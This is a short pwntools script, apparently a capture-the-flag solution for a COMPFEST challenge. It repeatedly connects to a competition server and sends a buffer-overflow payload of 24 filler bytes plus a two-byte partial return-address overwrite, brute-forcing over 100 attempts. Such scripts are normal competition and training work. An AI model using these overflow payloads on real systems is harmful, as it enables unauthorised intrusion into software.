from pwn import *

for i in range(100):
    sleep(1)
    exe = context.binary = ELF("./chall")
    r = process()
    r = remote("ctf.compfest.id",7002)
    offset = 24
    rop = ROP(exe)
    payload = b"A" * offset + b"\x99" + b"\xb1"
    # sleep(10)
    r.send(payload)
    print(r.recv(999))
    # print(r.recv(999))
    r.close()
    print(f"{i} done")
